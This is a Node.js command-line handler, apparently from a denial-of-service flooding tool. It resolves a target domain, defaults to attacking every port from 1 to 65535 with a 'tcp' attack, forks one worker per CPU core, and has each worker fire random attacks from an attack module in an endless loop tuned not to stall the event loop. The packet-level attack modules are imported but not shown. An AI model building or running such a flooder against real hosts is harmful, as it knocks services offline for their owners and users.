#!/usr/bin/env node

/* eslint-disable no-use-before-define */

const { isIP, isIPv6 } = require('net');
const os = require('os');
const cluster = require('cluster');

const ora = require('ora');

const dns = require('../dns');

const CLIError = require('../error');
const getRandom = require('../get-random');
const attackList = require('../attacks');

const cpus = os.cpus().length;

// Max requests in one event-loop turn
const max = 65535 / cpus;

/**
 * CLI handler
 * @param {object} program
 */
module.exports = async (program) => {
  if (cluster.isMaster) {
    await masterPath(program);
  } else {
    workerPath(program);
  }
};

/**
 * Master path
 * @param {object} program
 */
async function masterPath(program) {
  const params = getParams(program);
  const { target, ports, attacks } = params;
  const log = ora();

  process.on('exit', () => {
    log.stop();
  });

  validate(params, log);
  const ips = await resolveDoman(target, log);

  log.start('preparing');
  const options = await prepare(attacks, ips, ports);

  log.start('attacking');
  for (let i = 0; i < cpus; i++) {
    const worker = cluster.fork();
    worker.send(options);
  }
}

/**
 * Worker code path
 * @param {object} program
 */
function workerPath(program) {
  const { attacks } = getParams(program);

  function go(options) {
    for (let i = 0; i < max; i++) {
      const name = attacks[getRandom(0, attacks.length - 1)];

      attackList[name].attack(options[name]);
    }

    // Do no exhaust the event loop
    setTimeout(() => {
      go(options);
    });
  }

  process.on('message', go);
}

/**
 * Resolve domain name
 * @param {string} target
 * @param {object} log
 */
async function resolveDoman(target, log) {
  let ips;

  if (isIP(target)) {
    ips = [target];
  } else {
    log.start('resolving domain');
    ips = await dns(target);
  }

  return ips;
}

/**
 * validate cli params
 * @throws
 * @param {object} options
 * @param {object} log
 */
function validate(options, log) {
  options.attacks.forEach((attack) => {
    if (attack in attackList === false) {
      throw new CLIError({
        message: `attack "${attack}" is not implemented`,
        exitCode: 127,
        log
      });
    }
  });

  if (isIPv6(options.target)) {
    throw new CLIError({
      message: 'We do not support IPv6 yet',
      exitCode: 127,
      log
    });
  }
}

/**
 * Get params
 * @param {object} program
 * @returns {object}
 */
function getParams(program) {
  // Defaults
  let {

    // eslint-disable-next-line
    ports = '1-65535',
    attacks = ['tcp']
  } = program;

  if (program.attacks !== undefined) {
    attacks = program.attacks.replace(/\s/g, '').split(',');
  }

  return {
    attacks,
    ports,
    target: program.args[0]
  };
}

/**
 * Prepare the attacks
 * @param {array} attacks
 * @param {array} ips
 * @param {array} ports
 * @returns {object}
 */
async function prepare(attacks, ips, ports) {
  const options = {};

  await Promise.all(
    attacks.map((name) => {
      return attackList[name].prepare(ips, ports).then((result) => {
        options[name] = result;
      });
    })
  );

  return options;
}
